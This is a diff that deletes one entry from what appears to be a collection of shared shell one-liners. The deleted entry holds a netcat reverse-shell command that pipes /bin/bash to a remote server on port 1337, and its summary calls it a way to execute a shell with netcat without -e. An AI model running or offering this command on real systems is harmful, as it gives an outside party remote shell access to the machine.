@@ -1,8 +1,0 @@
-commandlinefu_id: 9055
-translator:
-  weibo: ''
-hide: true
-command: |-
-  mkfifo pipe && nc remote_server 1337 <pipe | /bin/bash &>pipe
-summary: |-
-  execute a shell with netcat without -e
